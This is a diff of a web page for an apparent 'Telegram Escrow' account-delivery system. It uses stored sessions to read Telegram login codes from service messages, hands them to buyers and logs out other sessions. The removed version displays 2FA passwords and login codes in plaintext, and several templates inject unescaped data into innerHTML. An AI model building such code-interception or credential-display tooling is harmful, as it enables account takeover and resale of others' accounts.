@@ -3,648 +3,264 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Manager - Admin Dashboard</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <title>Delivery - Telegram Escrow</title>
     <style>
-        .status-ready { background: #10b981; }
-        .status-waiting_code { background: #f59e0b; }
-        .status-code_sent { background: #3b82f6; }
-        .status-delivered { background: #6b7280; }
-        .status-force_secured { background: #ef4444; }
-        .status-expired { background: #9ca3af; }
-        .fade-in { animation: fadeIn 0.3s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
+        a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
+        .nav{background:#1e293b;border-bottom:1px solid #334155;padding:0 24px;display:flex;align-items:center;height:56px;gap:32px}
+        .nav-brand{font-weight:700;font-size:1.1rem;color:#38bdf8;display:flex;align-items:center;gap:8px}
+        .nav-links{display:flex;gap:4px}
+        .nav-links a{padding:8px 16px;border-radius:6px;color:#94a3b8;font-size:.875rem;font-weight:500;transition:.15s}
+        .nav-links a:hover,.nav-links a.active{background:#334155;color:#f1f5f9;text-decoration:none}
+        .container{max-width:800px;margin:0 auto;padding:32px 16px}
+        .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:24px;margin-bottom:16px}
+        .btn{padding:8px 18px;border-radius:8px;border:none;cursor:pointer;font-size:.85rem;font-weight:600;transition:.15s;display:inline-flex;align-items:center;gap:6px}
+        .btn:disabled{opacity:.5;cursor:not-allowed}
+        .btn-primary{background:#2563eb;color:#fff}.btn-primary:hover{background:#1d4ed8}
+        .btn-success{background:#16a34a;color:#fff}.btn-success:hover{background:#15803d}
+        .btn-danger{background:#dc2626;color:#fff}.btn-danger:hover{background:#b91c1c}
+        .btn-ghost{background:transparent;border:1px solid #475569;color:#94a3b8}.btn-ghost:hover{background:#334155;color:#e2e8f0}
+        .btn-lg{padding:12px 28px;font-size:1rem}
+        input[type="text"],input[type="tel"]{width:100%;background:#0f172a;border:1px solid #334155;color:#e2e8f0;padding:10px 14px;border-radius:8px;font-size:.9rem;outline:none;transition:.15s}
+        input:focus{border-color:#2563eb}
+        .spinner{width:18px;height:18px;border:2px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        /* Steps */
+        .steps{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:24px}
+        .step-card{background:#1e293b;border:2px solid #334155;border-radius:10px;padding:14px;text-align:center;transition:.2s}
+        .step-card .num{width:32px;height:32px;border-radius:50%;background:#334155;display:inline-flex;align-items:center;justify-content:center;font-weight:700;font-size:.85rem;margin-bottom:6px}
+        .step-card .lbl{font-size:.75rem;color:#64748b}
+        .step-card.active{border-color:#2563eb}.step-card.active .num{background:#2563eb}
+        .step-card.done{border-color:#16a34a}.step-card.done .num{background:#16a34a}
+        /* Content area */
+        .flow-content{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:32px;text-align:center}
+        .flow-content h3{font-size:1.15rem;margin-bottom:8px}
+        .flow-content p{color:#94a3b8;font-size:.9rem;margin-bottom:20px}
+        /* Code display */
+        .code-box{display:inline-block;background:#0f172a;border:2px solid #2563eb;border-radius:12px;padding:16px 32px;font-family:'Cascadia Code','Fira Code',monospace;font-size:2.2rem;font-weight:700;color:#60a5fa;letter-spacing:.15em;margin:12px 0}
+        .info-box{background:#172554;border:1px solid #1e40af;border-radius:8px;padding:12px 16px;font-size:.85rem;color:#93c5fd;margin:12px 0;text-align:left}
+        .warn-box{background:#422006;border:1px solid #854d0e;border-radius:8px;padding:12px 16px;font-size:.85rem;color:#fbbf24;margin:12px 0}
+        .success-box{background:#052e16;border:1px solid #166534;border-radius:12px;padding:32px;text-align:center;margin:12px 0}
+        .success-box h3{color:#4ade80;font-size:1.3rem;margin-bottom:8px}
+        /* Timer */
+        .timer{font-family:'Cascadia Code',monospace;font-size:1.6rem;font-weight:700;color:#f87171}
+        /* Toast */
+        .toast{position:fixed;top:16px;right:16px;z-index:200;padding:12px 20px;border-radius:8px;font-size:.85rem;font-weight:500;display:none;max-width:400px;box-shadow:0 8px 24px rgba(0,0,0,.3)}
+        .toast.show{display:block;animation:slideIn .3s ease}
+        .toast-ok{background:#052e16;border:1px solid #166534;color:#4ade80}
+        .toast-err{background:#450a0a;border:1px solid #991b1b;color:#f87171}
+        .toast-info{background:#172554;border:1px solid #1e40af;color:#60a5fa}
+        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+        .mono{font-family:'Cascadia Code','Fira Code',monospace}
+        @media(max-width:600px){.steps{grid-template-columns:repeat(2,1fr)}.nav-links{display:none}}
     </style>
 </head>
-<body class="bg-gray-900 text-white min-h-screen">
-    <nav class="bg-gray-800 border-b border-gray-700 px-6 py-4">
-        <div class="flex items-center justify-between">
-            <div class="flex items-center space-x-4">
-                <i class="fas fa-shield-alt text-blue-500 text-2xl"></i>
-                <h1 class="text-xl font-bold">Account Manager Dashboard</h1>
-            </div>
-            <div class="flex items-center space-x-4">
-                <span id="connection-status" class="flex items-center text-green-400">
-                    <i class="fas fa-circle text-xs mr-2"></i> Connected
-                </span>
-                <button onclick="refreshAll()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">
-                    <i class="fas fa-sync-alt mr-2"></i> Refresh
-                </button>
-            </div>
+<body>
+    <nav class="nav">
+        <div class="nav-brand">&#9889; Telegram Escrow</div>
+        <div class="nav-links">
+            <a href="/">Register</a>
+            <a href="/receive">Admin Panel</a>
+            <a href="/dashboard" class="active">Delivery</a>
         </div>
     </nav>
 
-    <div class="flex">
-        <aside class="w-64 bg-gray-800 min-h-screen p-4">
-            <nav class="space-y-2">
-                <a href="#delivery" onclick="showSection('delivery')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700 bg-gray-700">
-                    <i class="fas fa-paper-plane mr-3"></i> Delivery System
-                </a>
-                <a href="#accounts" onclick="showSection('accounts')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
-                    <i class="fas fa-users mr-3"></i> All Accounts
-                </a>
-                <a href="#credentials" onclick="showSection('credentials')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
-                    <i class="fas fa-key mr-3"></i> Credentials
-                </a>
-                <a href="#logs" onclick="showSection('logs')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
-                    <i class="fas fa-history mr-3"></i> Security Logs
-                </a>
-            </nav>
-        </aside>
+    <div id="toast" class="toast"></div>
 
-        <main class="flex-1 p-6">
-            <!-- Delivery Section -->
-            <section id="delivery-section" class="fade-in">
-                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-paper-plane mr-2"></i> Session Delivery</h2>
-                
-                <div class="bg-gray-800 rounded-lg p-6 mb-6">
-                    <div class="flex items-center space-x-4">
-                        <input type="text" id="phone-input" placeholder="Enter phone number (e.g. +1234567890)" 
-                               class="flex-1 bg-gray-700 border border-gray-600 rounded px-4 py-3 focus:outline-none focus:border-blue-500">
-                        <button onclick="checkSession()" id="btn-check" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded font-medium">
-                            <i class="fas fa-search mr-2"></i> Check Session
-                        </button>
-                    </div>
-                </div>
+    <div class="container">
+        <h2 style="font-size:1.4rem;margin-bottom:20px;font-weight:700">Session Delivery</h2>
 
-                <div id="delivery-flow" class="hidden">
-                    <div class="grid grid-cols-4 gap-4 mb-6">
-                        <div id="step-1" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
-                            <div class="flex items-center mb-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">1</div>
-                                <span class="font-medium">Check Session</span>
-                            </div>
-                            <p class="text-gray-400 text-sm">Verify session availability</p>
-                        </div>
-                        <div id="step-2" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
-                            <div class="flex items-center mb-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">2</div>
-                                <span class="font-medium">Request Code</span>
-                            </div>
-                            <p class="text-gray-400 text-sm">User requests login code</p>
-                        </div>
-                        <div id="step-3" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
-                            <div class="flex items-center mb-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">3</div>
-                                <span class="font-medium">Get Code</span>
-                            </div>
-                            <p class="text-gray-400 text-sm">Retrieve code & password</p>
-                        </div>
-                        <div id="step-4" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
-                            <div class="flex items-center mb-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">4</div>
-                                <span class="font-medium">Confirm</span>
-                            </div>
-                            <p class="text-gray-400 text-sm">Final confirmation</p>
-                        </div>
-                    </div>
-
-                    <div id="delivery-content" class="bg-gray-800 rounded-lg p-6">
-                        <!-- Dynamic content will be inserted here -->
-                    </div>
-                </div>
-
-                <div id="delivery-result" class="hidden bg-gray-800 rounded-lg p-6 mt-6">
-                    <div id="result-content"></div>
-                </div>
-            </section>
-
-            <!-- Accounts Section -->
-            <section id="accounts-section" class="hidden fade-in">
-                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-users mr-2"></i> All Accounts</h2>
-                
-                <div class="bg-gray-800 rounded-lg overflow-hidden">
-                    <table class="w-full">
-                        <thead class="bg-gray-700">
-                            <tr>
-                                <th class="px-4 py-3 text-left">Phone</th>
-                                <th class="px-4 py-3 text-left">Name</th>
-                                <th class="px-4 py-3 text-left">Status</th>
-                                <th class="px-4 py-3 text-left">Delivery</th>
-                                <th class="px-4 py-3 text-left">Sessions</th>
-                                <th class="px-4 py-3 text-left">Timer</th>
-                                <th class="px-4 py-3 text-left">Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="accounts-table">
-                            <tr><td colspan="7" class="text-center py-8 text-gray-400">Loading...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </section>
-
-            <!-- Credentials Section -->
-            <section id="credentials-section" class="hidden fade-in">
-                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-key mr-2"></i> Credentials (Restricted)</h2>
-                
-                <div class="bg-yellow-900/50 border border-yellow-600 rounded-lg p-4 mb-6">
-                    <i class="fas fa-exclamation-triangle text-yellow-400 mr-2"></i>
-                    <span class="text-yellow-200">Warning: This section contains sensitive information. Handle with care.</span>
-                </div>
-                
-                <div class="bg-gray-800 rounded-lg overflow-hidden">
-                    <table class="w-full">
-                        <thead class="bg-gray-700">
-                            <tr>
-                                <th class="px-4 py-3 text-left">Phone</th>
-                                <th class="px-4 py-3 text-left">2FA Password</th>
-                                <th class="px-4 py-3 text-left">Last Code</th>
-                                <th class="px-4 py-3 text-left">Created</th>
-                                <th class="px-4 py-3 text-left">Delivered</th>
-                            </tr>
-                        </thead>
-                        <tbody id="credentials-table">
-                            <tr><td colspan="5" class="text-center py-8 text-gray-400">Loading...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </section>
-
-            <!-- Logs Section -->
-            <section id="logs-section" class="hidden fade-in">
-                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-history mr-2"></i> Security Logs</h2>
-                
-                <div class="flex items-center space-x-4 mb-6">
-                    <input type="text" id="log-filter-phone" placeholder="Filter by phone..." 
-                           class="bg-gray-700 border border-gray-600 rounded px-4 py-2 focus:outline-none focus:border-blue-500">
-                    <button onclick="loadLogs()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">
-                        <i class="fas fa-filter mr-2"></i> Filter
-                    </button>
-                </div>
-                
-                <div class="bg-gray-800 rounded-lg overflow-hidden max-h-96 overflow-y-auto">
-                    <table class="w-full">
-                        <thead class="bg-gray-700 sticky top-0">
-                            <tr>
-                                <th class="px-4 py-3 text-left">Time</th>
-                                <th class="px-4 py-3 text-left">Phone</th>
-                                <th class="px-4 py-3 text-left">Action</th>
-                                <th class="px-4 py-3 text-left">Status</th>
-                                <th class="px-4 py-3 text-left">Details</th>
-                            </tr>
-                        </thead>
-                        <tbody id="logs-table">
-                            <tr><td colspan="5" class="text-center py-8 text-gray-400">Loading...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </section>
-        </main>
-    </div>
-
-    <!-- Confirmation Modal -->
-    <div id="confirm-modal" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-        <div class="bg-gray-800 rounded-lg p-6 max-w-md w-full mx-4">
-            <h3 class="text-xl font-bold mb-4" id="modal-title">Confirm Action</h3>
-            <p class="text-gray-300 mb-6" id="modal-message">Are you sure?</p>
-            <div class="flex justify-end space-x-4">
-                <button onclick="closeModal()" class="px-4 py-2 bg-gray-600 rounded hover:bg-gray-700">Cancel</button>
-                <button onclick="confirmModalAction()" id="modal-confirm-btn" class="px-4 py-2 bg-red-600 rounded hover:bg-red-700">Confirm</button>
+        <!-- Phone Input -->
+        <div id="phone-section" class="card">
+            <label style="font-size:.82rem;color:#94a3b8;display:block;margin-bottom:6px">Phone Number</label>
+            <div style="display:flex;gap:8px">
+                <input type="tel" id="phone-input" placeholder="+1234567890">
+                <button class="btn btn-primary" id="btn-check" onclick="checkSession()">Check</button>
             </div>
         </div>
+
+        <!-- Steps -->
+        <div id="steps-area" class="steps" style="display:none">
+            <div class="step-card" id="st-1"><div class="num">1</div><div class="lbl">Check</div></div>
+            <div class="step-card" id="st-2"><div class="num">2</div><div class="lbl">Request Code</div></div>
+            <div class="step-card" id="st-3"><div class="num">3</div><div class="lbl">Get Code</div></div>
+            <div class="step-card" id="st-4"><div class="num">4</div><div class="lbl">Confirm</div></div>
+        </div>
+
+        <!-- Dynamic Flow Content -->
+        <div id="flow" style="display:none"></div>
     </div>
 
-    <script>
-        const API_BASE = '/api/v1/delivery';
-        let currentPhone = '';
-        let currentStep = 0;
-        let modalCallback = null;
-        let countdownIntervals = {};
+<script>
+const API = location.origin + '/api/v1';
+let phone = '';
 
-        function showSection(section) {
-            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
-            document.getElementById(`${section}-section`).classList.remove('hidden');
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('bg-gray-700'));
-            event.target.closest('.nav-link').classList.add('bg-gray-700');
-            
-            if (section === 'accounts') loadAccounts();
-            if (section === 'credentials') loadAccounts();
-            if (section === 'logs') loadLogs();
+async function api(path, method='GET', body=null) {
+    const o = {method, headers:{'Content-Type':'application/json'}};
+    if (body) o.body = JSON.stringify(body);
+    const r = await fetch(API+path, o);
+    const j = await r.json();
+    if (!r.ok) throw new Error(j.detail||'Error');
+    return j;
+}
+
+let toastT;
+function toast(msg,type='info'){const t=document.getElementById('toast');t.className=`toast show toast-${type}`;t.textContent=msg;clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('show'),3500)}
+
+function setStep(n, status='active') {
+    for (let i=1;i<=4;i++){
+        const el=document.getElementById('st-'+i);
+        el.classList.remove('active','done');
+        if(i<n) el.classList.add('done');
+        else if(i===n && status==='done') el.classList.add('done');
+        else if(i===n) el.classList.add('active');
+    }
+}
+
+function setBtnLoading(id, loading) {
+    const b = document.getElementById(id);
+    if (!b) return;
+    b.disabled = loading;
+    if (loading) b.innerHTML = '<span class="spinner"></span> Loading...';
+}
+
+async function checkSession() {
+    phone = document.getElementById('phone-input').value.trim();
+    if (!phone) return toast('Enter a phone number','err');
+    setBtnLoading('btn-check', true);
+    try {
+        const r = await api(`/admin/account/${encodeURIComponent(phone)}`);
+        if (r.status === 'success' && r.account) {
+            document.getElementById('steps-area').style.display = '';
+            document.getElementById('flow').style.display = '';
+            setStep(1, 'done');
+            showRequestCode();
+            toast('Session found','ok');
+        } else {
+            toast('Session not found','err');
         }
+    } catch(e) {
+        toast(e.message,'err');
+    } finally {
+        setBtnLoading('btn-check', false);
+        document.getElementById('btn-check').innerHTML = 'Check';
+    }
+}
 
-        async function checkSession() {
-            const phone = document.getElementById('phone-input').value.trim();
-            if (!phone) return showError('Please enter a phone number');
-            
-            currentPhone = phone;
-            setLoading('btn-check', true);
-            
-            try {
-                const res = await fetch(`${API_BASE}/check-session`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone_number: phone })
-                });
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    document.getElementById('delivery-flow').classList.remove('hidden');
-                    updateStep(1, 'completed');
-                    showStep2();
-                } else {
-                    showError(data.error || data.detail || 'Session not available');
-                }
-            } catch (e) {
-                showError(e.message);
-            } finally {
-                setLoading('btn-check', false);
-            }
+function showRequestCode() {
+    setStep(2);
+    document.getElementById('flow').innerHTML = `
+        <div class="flow-content">
+            <h3>Request Login Code</h3>
+            <p>Ask the buyer to request a login code from the official Telegram app, then click below.</p>
+            <button class="btn btn-primary btn-lg" id="btn-req" onclick="requestCode()">I've Requested the Code</button>
+        </div>`;
+}
+
+async function requestCode() {
+    setBtnLoading('btn-req', true);
+    try {
+        await api(`/delivery/request-code/${encodeURIComponent(phone)}`,'POST');
+        setStep(2,'done');
+        showGetCode();
+        toast('Code requested','ok');
+    } catch(e) { toast(e.message,'err'); }
+    finally { setBtnLoading('btn-req',false); document.getElementById('btn-req') && (document.getElementById('btn-req').textContent="I've Requested the Code"); }
+}
+
+function showGetCode() {
+    setStep(3);
+    document.getElementById('flow').innerHTML = `
+        <div class="flow-content">
+            <h3>Retrieve Login Code</h3>
+            <p>The system will read the code from Telegram messages (777000).</p>
+            <button class="btn btn-success btn-lg" id="btn-get" onclick="getCode()">Retrieve Code</button>
+            <div id="code-result" style="margin-top:16px"></div>
+        </div>`;
+}
+
+async function getCode() {
+    setBtnLoading('btn-get', true);
+    try {
+        const r = await api(`/email/code-fallback/${encodeURIComponent(phone)}`);
+        if (r.status === 'success' && r.code) {
+            setStep(3,'done');
+            showConfirm(r);
+        } else if (r.status === 'waiting') {
+            document.getElementById('code-result').innerHTML = `<div class="info-box">Waiting for code... Try again in a few seconds.</div>`;
+        } else {
+            toast(r.message||'No code yet','info');
         }
+    } catch(e) { toast(e.message,'err'); }
+    finally { setBtnLoading('btn-get',false); const b=document.getElementById('btn-get'); if(b) b.textContent='Retrieve Code'; }
+}
 
-        function showStep2() {
-            updateStep(2, 'active');
-            document.getElementById('delivery-content').innerHTML = `
-                <div class="text-center py-8">
-                    <i class="fas fa-mobile-alt text-6xl text-blue-400 mb-4"></i>
-                    <h3 class="text-xl font-bold mb-2">Request Login Code</h3>
-                    <p class="text-gray-400 mb-6">Please request a login code from the official Telegram app, then click the button below.</p>
-                    <button onclick="requestCode()" id="btn-request-code" class="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-lg font-medium">
-                        <i class="fas fa-check mr-2"></i> I've Requested the Code
-                    </button>
-                </div>
-            `;
-        }
+function showConfirm(data) {
+    setStep(4);
+    const deadline = data.confirmation_deadline ? new Date(data.confirmation_deadline) : null;
+    const timeoutMin = data.timeout_minutes || 30;
+    
+    let html = `<div class="flow-content">
+        <h3>Delivery Ready</h3>
+        <div class="code-box">${data.code}</div>
+        <div class="info-box">
+            <strong>2FA:</strong> ${data.has_password ? 'Exists (protected)' : 'No 2FA'}
+        </div>`;
+    
+    if (deadline) {
+        html += `<div class="warn-box" style="display:flex;justify-content:space-between;align-items:center">
+            <span>Confirmation deadline:</span>
+            <span class="timer" id="countdown">${timeoutMin}:00</span>
+        </div>`;
+    }
+    
+    html += `<div style="margin-top:20px">
+            <button class="btn btn-success btn-lg" id="btn-confirm" onclick="confirmDelivery()">Buyer Logged In Successfully</button>
+        </div>
+    </div>`;
+    
+    document.getElementById('flow').innerHTML = html;
+    if (deadline) startCountdown(deadline);
+}
 
-        async function requestCode() {
-            setLoading('btn-request-code', true);
-            
-            try {
-                const res = await fetch(`${API_BASE}/request-code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone_number: currentPhone })
-                });
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    updateStep(2, 'completed');
-                    showStep3();
-                } else {
-                    showError(data.error || data.detail);
-                }
-            } catch (e) {
-                showError(e.message);
-            } finally {
-                setLoading('btn-request-code', false);
-            }
-        }
+function startCountdown(deadline) {
+    const el = document.getElementById('countdown');
+    if (!el) return;
+    const iv = setInterval(() => {
+        const d = deadline - new Date();
+        if (d <= 0) { clearInterval(iv); el.textContent = 'EXPIRED'; return; }
+        const m = Math.floor(d/60000), s = Math.floor((d%60000)/1000);
+        el.textContent = `${m}:${String(s).padStart(2,'0')}`;
+    }, 1000);
+}
 
-        function showStep3() {
-            updateStep(3, 'active');
-            document.getElementById('delivery-content').innerHTML = `
-                <div class="text-center py-8">
-                    <i class="fas fa-spinner fa-spin text-6xl text-yellow-400 mb-4"></i>
-                    <h3 class="text-xl font-bold mb-2">Waiting for Code...</h3>
-                    <p class="text-gray-400 mb-6">The system is waiting for the login code to arrive.</p>
-                    <button onclick="getCode()" id="btn-get-code" class="bg-green-600 hover:bg-green-700 px-8 py-3 rounded-lg font-medium">
-                        <i class="fas fa-download mr-2"></i> Retrieve Code
-                    </button>
-                </div>
-            `;
-        }
+async function confirmDelivery() {
+    if (!confirm('Confirm delivery? Sessions will be logged out.')) return;
+    setBtnLoading('btn-confirm', true);
+    try {
+        const r = await api(`/delivery/confirm/${encodeURIComponent(phone)}`,'POST',{received:true});
+        setStep(4,'done');
+        document.getElementById('flow').innerHTML = `
+            <div class="success-box">
+                <div style="font-size:3rem;margin-bottom:12px">&#10004;</div>
+                <h3>Delivery Complete!</h3>
+                <p style="color:#86efac;margin-top:8px">${r.message||'Account delivered successfully'}</p>
+                ${r.logout_results ? `<p style="color:#64748b;font-size:.8rem;margin-top:8px">${r.logout_results.join(' | ')}</p>` : ''}
+                <button class="btn btn-ghost" style="margin-top:20px" onclick="location.reload()">New Delivery</button>
+            </div>`;
+        toast('Delivery confirmed','ok');
+    } catch(e) { toast(e.message,'err'); }
+}
 
-        async function getCode() {
-            setLoading('btn-get-code', true);
-            
-            try {
-                const res = await fetch(`${API_BASE}/get-code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone_number: currentPhone })
-                });
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    updateStep(3, 'completed');
-                    showStep4(data);
-                } else if (data.status === 'waiting') {
-                    showInfo(data.message);
-                } else {
-                    showError(data.error || data.detail);
-                }
-            } catch (e) {
-                showError(e.message);
-            } finally {
-                setLoading('btn-get-code', false);
-            }
-        }
-
-        function showStep4(data) {
-            updateStep(4, 'active');
-            
-            const deadline = new Date(data.confirmation_deadline);
-            
-            document.getElementById('delivery-content').innerHTML = `
-                <div class="grid grid-cols-2 gap-6">
-                    <div class="bg-gray-700 rounded-lg p-6">
-                        <h4 class="text-lg font-bold mb-4"><i class="fas fa-key text-blue-400 mr-2"></i> Login Code</h4>
-                        <div class="text-4xl font-mono font-bold text-blue-400">${data.code}</div>
-                    </div>
-                    <div class="bg-gray-700 rounded-lg p-6">
-                        <h4 class="text-lg font-bold mb-4"><i class="fas fa-lock text-green-400 mr-2"></i> 2FA Password</h4>
-                        <div class="text-lg font-mono text-green-400 break-all">${data.password || 'No 2FA'}</div>
-                    </div>
-                </div>
-                
-                <div class="mt-6 bg-red-900/30 border border-red-600 rounded-lg p-4">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <i class="fas fa-clock text-red-400 mr-2"></i>
-                            <span class="text-red-200">Confirmation deadline:</span>
-                        </div>
-                        <div id="countdown" class="text-2xl font-bold text-red-400">${data.timeout_minutes}:00</div>
-                    </div>
-                    <p class="text-red-300 text-sm mt-2">If not confirmed within timeout and new session detected, account will be force-secured.</p>
-                </div>
-                
-                <div class="mt-6 text-center">
-                    <button onclick="confirmDelivery()" id="btn-confirm" class="bg-green-600 hover:bg-green-700 px-8 py-4 rounded-lg font-medium text-lg">
-                        <i class="fas fa-check-circle mr-2"></i> I Have Logged In Successfully
-                    </button>
-                </div>
-            `;
-            
-            startCountdown(deadline);
-        }
-
-        function startCountdown(deadline) {
-            const countdownEl = document.getElementById('countdown');
-            if (!countdownEl) return;
-            
-            const interval = setInterval(() => {
-                const now = new Date();
-                const diff = deadline - now;
-                
-                if (diff <= 0) {
-                    clearInterval(interval);
-                    countdownEl.textContent = 'EXPIRED';
-                    return;
-                }
-                
-                const mins = Math.floor(diff / 60000);
-                const secs = Math.floor((diff % 60000) / 1000);
-                countdownEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
-            }, 1000);
-        }
-
-        async function confirmDelivery() {
-            setLoading('btn-confirm', true);
-            
-            try {
-                const res = await fetch(`${API_BASE}/confirm`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone_number: currentPhone })
-                });
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    updateStep(4, 'completed');
-                    document.getElementById('delivery-content').innerHTML = `
-                        <div class="text-center py-12">
-                            <i class="fas fa-check-circle text-8xl text-green-400 mb-6"></i>
-                            <h3 class="text-2xl font-bold text-green-400 mb-2">Delivery Complete!</h3>
-                            <p class="text-gray-400">${data.message}</p>
-                            <div class="mt-4 text-sm text-gray-500">
-                                ${data.logout_results ? data.logout_results.join(' | ') : ''}
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    showError(data.error || data.detail);
-                }
-            } catch (e) {
-                showError(e.message);
-            } finally {
-                setLoading('btn-confirm', false);
-            }
-        }
-
-        function updateStep(step, status) {
-            for (let i = 1; i <= 4; i++) {
-                const el = document.getElementById(`step-${i}`);
-                el.classList.remove('border-green-500', 'border-blue-500', 'border-gray-700');
-                
-                if (i < step) {
-                    el.classList.add('border-green-500');
-                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-blue-600');
-                    el.querySelector('div > div').classList.add('bg-green-600');
-                } else if (i === step && status === 'active') {
-                    el.classList.add('border-blue-500');
-                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-green-600');
-                    el.querySelector('div > div').classList.add('bg-blue-600');
-                } else if (i === step && status === 'completed') {
-                    el.classList.add('border-green-500');
-                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-blue-600');
-                    el.querySelector('div > div').classList.add('bg-green-600');
-                } else {
-                    el.classList.add('border-gray-700');
-                }
-            }
-        }
-
-        async function loadAccounts() {
-            try {
-                const res = await fetch(`${API_BASE}/accounts`);
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    renderAccountsTable(data.accounts);
-                    renderCredentialsTable(data.accounts);
-                }
-            } catch (e) {
-                console.error('Error loading accounts:', e);
-            }
-        }
-
-        function renderAccountsTable(accounts) {
-            const tbody = document.getElementById('accounts-table');
-            if (!accounts.length) {
-                tbody.innerHTML = '<tr><td colspan="7" class="text-center py-8 text-gray-400">No accounts found</td></tr>';
-                return;
-            }
-            
-            tbody.innerHTML = accounts.map(acc => `
-                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
-                    <td class="px-4 py-3 font-mono">${acc.phone}</td>
-                    <td class="px-4 py-3">${acc.first_name || '-'}</td>
-                    <td class="px-4 py-3">
-                        <span class="px-2 py-1 rounded text-xs bg-gray-600">${acc.status || '-'}</span>
-                    </td>
-                    <td class="px-4 py-3">
-                        <span class="px-2 py-1 rounded text-xs status-${acc.delivery_status || 'none'}">${acc.delivery_status || '-'}</span>
-                    </td>
-                    <td class="px-4 py-3">
-                        ${acc.has_pyrogram ? '<i class="fas fa-check text-green-400 mr-1" title="Pyrogram"></i>' : '<i class="fas fa-times text-red-400 mr-1"></i>'}
-                        ${acc.has_telethon ? '<i class="fas fa-check text-green-400" title="Telethon"></i>' : '<i class="fas fa-times text-red-400"></i>'}
-                    </td>
-                    <td class="px-4 py-3 text-sm">
-                        ${acc.confirmation_deadline ? `<span class="text-yellow-400" id="timer-${acc.phone}">${formatDeadline(acc.confirmation_deadline)}</span>` : '-'}
-                    </td>
-                    <td class="px-4 py-3">
-                        <button onclick="forceSecure('${acc.phone}')" class="text-yellow-400 hover:text-yellow-300 mr-2" title="Force Secure">
-                            <i class="fas fa-shield-alt"></i>
-                        </button>
-                        <button onclick="deleteAccount('${acc.phone}')" class="text-red-400 hover:text-red-300" title="Delete">
-                            <i class="fas fa-trash"></i>
-                        </button>
-                    </td>
-                </tr>
-            `).join('');
-        }
-
-        function renderCredentialsTable(accounts) {
-            const tbody = document.getElementById('credentials-table');
-            if (!accounts.length) {
-                tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-gray-400">No accounts found</td></tr>';
-                return;
-            }
-            
-            tbody.innerHTML = accounts.map(acc => `
-                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
-                    <td class="px-4 py-3 font-mono">${acc.phone}</td>
-                    <td class="px-4 py-3 font-mono text-green-400">${acc.password || '<span class="text-gray-500">None</span>'}</td>
-                    <td class="px-4 py-3 font-mono text-blue-400">${acc.last_code || '<span class="text-gray-500">-</span>'}</td>
-                    <td class="px-4 py-3 text-sm text-gray-400">${acc.created_at ? new Date(acc.created_at).toLocaleString() : '-'}</td>
